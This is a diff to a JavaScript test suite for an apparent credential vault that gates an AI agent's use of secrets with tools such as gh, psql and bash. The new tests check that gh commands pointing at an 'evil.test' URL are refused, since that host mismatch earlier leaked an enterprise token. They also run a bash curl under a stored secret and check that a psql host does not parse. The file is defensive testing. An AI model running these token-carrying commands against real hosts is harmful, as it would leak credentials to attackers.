@@ -197,7 +197,7 @@ const ROWS = {
   channels: [{ entry: 'lark1', field: 'token', label: 'lark', kind: 'token', bytes: 40, v: 'channel-token-abcdefghijklmnop' }],
   secrets: [{ entry: 'host:dev1', field: 'token', label: 'link', bytes: 40, v: 'pairing-token-abcdefghijklmnop' }, { entry: 'agent:conv-1/gh-token', field: 'secret', label: 'Agent secret · gh-token', bytes: 30, v: 'agent-minted-value-0123456789' },
     { entry: 'agent:conv-1/site-pw', field: 'secret', label: 'Agent secret · site-pw', bytes: 29, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane X', forHost: 'api.example.com' }, v: 'agent-minted-pw-0123456789abc' },
-    { entry: 'agent:conv-1/gh-mint', field: 'secret', label: 'Agent secret · gh-mint', bytes: 30, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane X', forHost: 'github.com' }, v: 'agent-minted-ghv-0123456789abc' }],   // lane vault-agent-own (r13): a MINTED own entry --for github.com (the cross-host minor: a call -R ghe.* approved on a card homes to the APPROVED host)   // lane vault-agent-own: a MINTED own entry, --for api.example.com
+    { entry: 'agent:conv-1/gh-mint', field: 'secret', label: 'Agent secret · gh-mint', bytes: 30, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane X', forHost: 'github.com' }, v: 'agent-minted-ghv-0123456789abc' }, { entry: 'agent:conv-1/gh-ghe', field: 'secret', label: 'Agent secret \u00b7 gh-ghe', bytes: 31, provenance: { by: 'agent', prov: 'minted', sawPlaintext: false, actor: 'Lane X', forHost: 'ghe.example.test' }, v: 'agent-minted-ghe-0123456789abcd' }],   // round 16: a MINTED own entry --for a GHES host (the two_hosts BLOCKER: a <url> positional's host != the -R / GH_HOST host)   // lane vault-agent-own (r13): a MINTED own entry --for github.com (the cross-host minor: a call -R ghe.* approved on a card homes to the APPROVED host)   // lane vault-agent-own: a MINTED own entry, --for api.example.com
 };
 const sourceOf = (store) => ({ vaultRows: () => ROWS[store].map(({ v, ...r }) => r), vaultReveal: (e, f) => { const r = ROWS[store].find((x) => x.entry === e && x.field === f); return r ? r.v : null; } });
 const CALLER = { conversationId: 'conv-1', sessionKey: 'claude:conv-1', name: 'Lane X', cwd: null };
@@ -932,7 +932,7 @@ console.log('⑪ THE OWN ROAD (lane vault-agent-own) — what an agent stored it
   const mine = (w.door.runnableFor({ ...w.caller, scope: 'sess-77-1', conv: 'conv-1' }).entries || []).filter((e) => e.by === 'own').map((e) => e.ref).sort();
   const theirs = (w.door.runnableFor({ ...w.caller, conversationId: 'conv-2', scope: 'sess-79-1', conv: 'conv-2' }).entries || []).map((e) => e.ref);
   const mintedRow = (w.door.runnableFor({ ...w.caller, scope: 'sess-77-1', conv: 'conv-1' }).entries || []).find((e) => e.ref === MINT) || {};
-  ok(mine.join() === [MINT, OWN, 'vault://agent:conv-1/gh-mint'].sort().join() && !theirs.some((r) => r.startsWith('vault://agent:conv-1/')) && mintedRow.minted === true && mintedRow.for === 'api.example.com', '`list` names its own entries (by own; a minted one with its host) to its conversation — and never to another', { mine, theirs, mintedRow });
+  ok(mine.join() === [MINT, OWN, 'vault://agent:conv-1/gh-mint', 'vault://agent:conv-1/gh-ghe'].sort().join() && !theirs.some((r) => r.startsWith('vault://agent:conv-1/')) && mintedRow.minted === true && mintedRow.for === 'api.example.com', '`list` names its own entries (by own; a minted one with its host) to its conversation — and never to another', { mine, theirs, mintedRow });
   openRow(w);
   const owner = await runAnswered(w, ['--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'env'], { answer: 'once' });
   const od = (owner.card && owner.card.detail) || '';
@@ -1269,6 +1269,92 @@ console.log('⑪ THE OWN ROAD (lane vault-agent-own) — what an agent stored it
       ok(hits === 0 && got === 0, 'round 12 (minor 4, WIRE): the REAL pinned gh, run through the door with a planted config.yml (http_unix_socket → my live socket), connected to the socket ZERO times and sent ZERO bytes — the seal (GH_CONFIG_DIR=NOWHERE) means no planted config / hosts is read; the token never reached the agent socket', { hits, bytes: got, exit: rW.exit, stderr: (rW.stderr || '').slice(0, 90) });
       ok(rW.ok === true && rW.by === 'own', 'round 12/14/15 (minor 4): the REAL pinned gh is SEALED (root-owned) and its live bytes are DRIFT-RECORDED (never gated), and it RAN ok:own — the streaming sha256 the door computes on the live binary is the drift record, exec\'d as the SAME inode via /proc/fd', { ok: rW.ok, by: rW.by, exit: rW.exit });
     } finally { server.close(); try { fs.unlinkSync(sockPath); } catch { } }
+  }
+
+  // ── ROUND 16 ITEM 1 (BLOCKER): a <url> POSITIONAL whose host differs from -R / GH_HOST is TWO route hosts ⇒ two_hosts ──
+  // base (6df327c0): urlArg did not exist, so the URL host was DROPPED from routeHosts; the verdict saw only the -R host, approved
+  // ok:own with NO card, and the seal homed GH_ENTERPRISE_TOKEN to the -R host while gh CONTACTED the URL's host (evil.test) — the
+  // leak, proven end-to-end by the report's dead-proxy GH_DEBUG=api trace (Host: evil.test, Authorization: token ████).
+  {
+    const EVIL = { 'issue view': 'https://evil.test/o/r/issues/1', 'pr view': 'https://evil.test/o/r/pull/2', 'issue comment': 'https://evil.test/o/r/issues/1', 'issue close': 'https://evil.test/o/r/issues/1', 'pr checks': 'https://evil.test/o/r/pull/2' };
+    const bad = [];
+    for (const [verb, url] of Object.entries(EVIL)) {
+      const cap = capOf();
+      const dV = mkGh({ spawnImpl: cap.spawn, agentEnv: () => ({ ...process.env, HOME: os.homedir(), PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
+      const extra = verb === 'issue comment' ? ['--body', 'x'] : [];
+      const r = await dV.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, ...verb.split(' '), url, '-R', 'ghe.example.test/o/r', ...extra], cwd: sw.work });
+      if (!(r.code === 'two_hosts' && !cap.get() && Array.isArray(r.hosts) && r.hosts.includes('evil.test') && r.hosts.includes('ghe.example.test') && /evil\.test/.test(r.words || '') && /ghe\.example\.test/.test(r.words || ''))) bad.push([verb, r.code, !!cap.get(), r.hosts]);
+    }
+    ok(!bad.length, `round 16 (BLOCKER): each URL-positional gh verb (${Object.keys(EVIL).join(', ')}) with a <url> host != the -R host ⇒ two_hosts BY NAME, naming BOTH hosts, nothing spawned — base dropped the URL host, approved ok:own, and homed GH_ENTERPRISE_TOKEN to the URL's host`, bad);
+    // no FALSE two_hosts: a <url> whose host EQUALS the -R host (one route), and a number positional, both run ok:own
+    const c1 = capOf(), c2 = capOf();
+    const d1 = mkGh({ spawnImpl: c1.spawn, agentEnv: () => ({ ...process.env, HOME: os.homedir(), PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
+    const r1 = await d1.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, 'issue', 'view', 'https://ghe.example.test/o/r/issues/1', '-R', 'ghe.example.test/o/r'], cwd: sw.work });
+    const d2 = mkGh({ spawnImpl: c2.spawn, agentEnv: () => ({ ...process.env, HOME: os.homedir(), PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
+    const r2 = await d2.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, 'issue', 'view', '123', '-R', 'ghe.example.test/o/r'], cwd: sw.work });
+    const E1 = c1.get() ? c1.get().env : {}, E2 = c2.get() ? c2.get().env : {};
+    ok(r1.ok && r1.by === 'own' && E1.GH_HOST === 'ghe.example.test' && !!E1.GH_ENTERPRISE_TOKEN && !E1.GH_TOKEN && r2.ok && r2.by === 'own' && E2.GH_HOST === 'ghe.example.test', 'round 16: NO false two_hosts — a <url> whose host EQUALS the -R host (one route), and a number positional + -R, both run ok:own with GH_HOST pinned to the ghe host + GH_ENTERPRISE_TOKEN homed', { r1: r1.code || r1.by, GH_HOST1: E1.GH_HOST, cred1: E1.GH_ENTERPRISE_TOKEN ? 'ENTERPRISE' : (E1.GH_TOKEN ? 'GH_TOKEN' : '-'), r2: r2.code || r2.by });
+  }
+
+  // ── ROUND 16 ITEM 2 (MAJOR): a no-row tool (a shell) names its host on the card, never «unknown» ──
+  {
+    const cap = capOf();
+    const dSh = sw.mk(DOOR, { isRootOwned: REAL, spawnImpl: cap.spawn, agentEnv: () => ({ ...process.env, HOME: os.homedir(), PATH: ['/usr/bin', '/bin'].join(':') }) });
+    const p = dSh.run({ caller: sw.caller, args: ['--env', 'T=vault://agent:conv-1/site-pw', '--', 'bash', '-c', 'curl https://x.example'], cwd: sw.work });
+    const c = await waitCard(sw); const d = c ? c.detail : '';
+    if (c) dSh.answer(c.action.askId, { answer: 'deny' });
+    await p.catch(() => {});
+    const hostsLine = (d.match(/^Hosts: (.+)$/m) || [])[1] || '(no card)';
+    ok(!!c && /x\.example/.test(hostsLine) && !/unknown/.test(hostsLine), 'round 16 (MAJOR): bash -c "curl https://x.example" under a minted value — the card names x.example on the Hosts line (base said «unknown — the tool names none»: routeHosts was empty for a no-row tool)', { hostsLine });
+  }
+
+  // ── ROUND 16 MINOR #1: a routing host that does not parse ⇒ bad_host, never «null» at the verdict ──
+  {
+    const PSQLDIR = path.join(ROOT, 'psqlbin'); fs.mkdirSync(PSQLDIR, { recursive: true });
+    fs.writeFileSync(path.join(PSQLDIR, 'psql'), '#!/bin/sh\necho psql\n', { mode: 0o755 });
+    const cap = capOf();
+    const dP = sw.mk(DOOR, { isRootOwned: REAL, spawnImpl: cap.spawn, agentEnv: () => ({ ...process.env, HOME: os.homedir(), PATH: [PSQLDIR, '/usr/bin', '/bin'].join(':') }) });
+    const r = await dP.run({ caller: sw.caller, args: ['--env', 'PGPASSWORD=vault://agent:conv-1/site-pw', '--', 'psql', '-h', ',db.example.com'], cwd: sw.work });
+    ok(r.code === 'bad_host' && !cap.get() && !cardsOf(sw).length, 'round 16 (MINOR): psql -h ,db.example.com (a host-list element that does not parse ⇒ null) ⇒ bad_host BY NAME, no card, nothing ran — base let a null host reach the verdict («sends it to null»)', { code: r.code, spawned: !!cap.get() });
+  }
+
+  // ── ROUND 16 MINOR #2: a MALFORMED drift record is discarded + rewritten — the sealed gh still RUNS (never fails forever) ──
+  {
+    const toolsFile = path.join(sw.dataDir, 'vault-run-tools.json');
+    fs.writeFileSync(toolsFile, JSON.stringify({ v: 1, tools: { [GHREAL_GH]: { sha256: 123 } } }));   // a number sha256: base's driftNote did prev.sha256.slice and THREW, failing EVERY sealed gh run and never healing
+    const cap = capOf();
+    const dM = mkGh({ spawnImpl: cap.spawn, agentEnv: () => ({ ...process.env, HOME: os.homedir(), PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
+    let threw = null, r = null;
+    try { r = await dM.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-token', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work }); } catch (e) { threw = (e && e.message) || String(e); }
+    const rec = JSON.parse(fs.readFileSync(toolsFile, 'utf8')).tools[GHREAL_GH];
+    ok(!threw && r && r.ok && r.by === 'own' && !!cap.get() && rec && typeof rec.sha256 === 'string', 'round 16 (MINOR): a MALFORMED drift record (sha256 is a number) is DISCARDED and rewritten as a fresh baseline — the sealed gh RUNS ok:own (base THREW on prev.sha256.slice, failing every sealed gh run and never healing)', { threw, ok: r && r.ok, recSha: rec && typeof rec.sha256 });
+  }
+
+  // ── ROUND 16 MINOR #3: the post-verdict tool_not_sealed (ownership moved between the hash and the spawn) RESTORES the once-grant ──
+  {
+    const w3 = await world({ instance: 'local' });
+    let seals = 0;
+    const statefulSeal = (p, fd) => { if (p !== GHREAL_GH) return DOOR.sealedToolReal(p, fd); seals++; return seals === 1; };   // SEALED at the in-block hash, UNSEALED at the pre-spawn re-check (ownership changed between them)
+    const cap = capOf();
+    const d3 = w3.mk(DOOR, { isRootOwned: REAL, toolDigest: digestVouch, toolSealed: statefulSeal, spawnImpl: cap.spawn, agentEnv: () => ({ ...process.env, HOME: os.homedir(), PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
+    const q3 = d3.request({ caller: w3.caller, entry: 'vault://mounts/m1/secretKey', purpose: 'drift re-check' });
+    d3.answerRequest(q3.askId, { answer: 'once', reauthed: true });
+    const before = d3._grants.size;
+    const pr3 = d3.run({ caller: w3.caller, args: ['--env', 'GH_TOKEN=vault://mounts/m1/secretKey', '--', GHREAL_GH, 'issue', 'list'], cwd: w3.work });
+    const c3 = await waitCard(w3, 800); if (c3) d3.answer(c3.action.askId, { answer: 'once' });   // a host pass may be asked; answering it does not touch the pre-created m1 once-grant (admitted before the ask)
+    const r3 = await pr3;
+    ok(before === 1 && r3.code === 'tool_not_sealed' && /ownership changed between/.test(r3.words || '') && !cap.get() && d3._grants.size === 1, 'round 16 (MINOR): a tool whose ownership changes between the hash and the spawn ⇒ tool_not_sealed AFTER the spend RESTORES the once-grant (nothing ran) and the words name THIS path (not the directory-writable remedy) — base lost the grant with nothing run', { code: r3.code, grantsBefore: before, grantsAfter: d3._grants.size, words: (r3.words || '').slice(0, 56) });
+  }
+
+  // ── ROUND 16 MINOR #4: a plain gh card never «mentions» the row default (api.github.com) ──
+  {
+    const cap = capOf();
+    const dM4 = mkGh({ spawnImpl: cap.spawn, agentEnv: () => ({ ...process.env, HOME: os.homedir(), PATH: [GHREAL, '/usr/bin', '/bin'].join(':') }) });
+    const p = dM4.run({ caller: sw.caller, args: ['--env', 'GH_TOKEN=vault://agent:conv-1/gh-ghe', '--', GHREAL_GH, 'issue', 'list'], cwd: sw.work });
+    const c = await waitCard(sw); const d = c ? c.detail : '';
+    if (c) dM4.answer(c.action.askId, { answer: 'deny' });
+    await p.catch(() => {});
+    ok(!!c && /^Hosts: github\.com$/m.test(d) && !/Mentions/.test(d), 'round 16 (MINOR): a plain gh card (a GHES-minted value routed to github.com) names Hosts: github.com and shows NO Mentions line — base leaked the row default api.github.com into «Mentions» (a row default is a route host, never a mention)', { hosts: (d.match(/^Hosts: .+$/m) || [])[0], mentions: (d.match(/^Mentions.+$/m) || [])[0] || 'none' });
   }
 }
 try { fs.chmodSync(BIN, 0o755); } catch { }   // the read-only bin given back (the scratch dir is removed)
